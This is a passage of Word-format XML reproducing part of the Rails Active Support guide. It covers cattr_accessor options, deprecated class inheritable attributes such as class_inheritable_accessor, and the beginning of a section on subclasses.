              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>MysqlAdapter &lt; AbstractAdapter</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="526762E6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # Generates class methods to access @@emulate_booleans.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6349FA74" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  cattr_accessor :emulate_booleans</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="281A195F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  self.emulate_booleans = true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C4C1434" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="38CC3853" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Instance methods are created as well for convenience, they are just proxies to the class attribute. So, instances can change the class attribute, but cannot override it as it happens with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>class_attribute</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (see above). For example given</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5208"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0B200098" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0D9995B5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActionView</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5810F427" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1D736D3D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    cattr_accessor :field_error_proc</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7032744E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @@field_error_proc</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= Proc.new{ ... }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AA4C88C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7EAE9891" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="65C37BE4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">we can access </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>field_error_proc</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in views.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1774CE45" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The generation of the reader instance method can be prevented by setting </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:instance_reader</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and the generation of the writer instance method can be prevented by setting </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:instance_writer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Generation of both methods can be prevented by setting </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:instance_accessor</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. In all cases, the value must be exactly </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and not any false value.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8280"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="179A4FB3" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7719EAE1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>A</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3854B452" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>B</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24968DED" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # No first_name instance reader is generated.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3ECF724C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    cattr_accessor :first_name, :instance_reader</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3760A61A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # No last_name= instance writer is generated.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11D0FAC8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    cattr_accessor :last_name, :instance_writer</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19317B23" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # No surname instance reader or surname= writer is generated.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A4DB533" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    cattr_accessor :surname, :instance_accessor</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="322D23F2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08C8BA28" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="15F03E3A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A model may find it useful to set </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:instance_accessor</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as a way to prevent mass-assignment from setting the attribute.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C8FF363" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/class/attribute_accessors.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7978FF45" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 Class Inheritable Attributes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31E5DFE5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Class Inheritable Attributes are deprecated. It’s recommended that you use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Class#class_attribute</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> instead.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ACB2856" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Class variables are shared down the inheritance tree. Class instance variables are not shared, but they are not inherited either. The macros </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>class_inheritable_reader</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>class_inheritable_writer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>class_inheritable_accessor</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> provide accessors for class-level data which is inherited but not shared with children:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6378BEDB" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3ED74468" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActionController</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63682976" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E0B9259" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # FIXME: REVISE/SIMPLIFY THIS COMMENT.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0CFA2B30" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # The value of allow_forgery_protection is inherited,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74579585" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # but its value in a particular class does not affect</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F0FFB49" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # the value in the rest of the controllers hierarchy.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="032815FC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    class_inheritable_accessor :allow_forgery_protection</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33E01EB1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38064458" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2A3EBE10" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">They accomplish this with class instance variables and cloning on subclassing, there are no class variables involved. Cloning is performed with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>dup</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as long as the value is duplicable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="440E31DF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>There are some variants specialised in arrays and hashes:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2760"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="26D15A69" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6F9C0B7B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class_inheritable_array</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="507154DC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class_inheritable_hash</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4886237E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Those writers take any inherited array or hash into account and extend them rather than overwrite them.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D0C7F33" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As with vanilla class attribute accessors these macros create convenience instance methods for reading and writing. The generation of the writer instance method can be prevented setting </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:instance_writer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (not any false value, but exactly </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</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4C58E387" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4378ACFB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActiveRecord</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0790F0C7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E71C2BB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    class_inheritable_accessor :default_scoping, :instance_writer</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D4861DD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CDF44A2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="091D8272" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Since values are copied when a subclass is defined, if the base class changes the attribute after that, the subclass does not see the new value. That’s the point.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C21FF11" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/class/inheritable_attributes.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F431D18" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 Subclasses &amp; Descendants</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CC00D77" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.3.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>subclasses</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED16FB6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>subclasses</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns the subclasses of the receiver:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
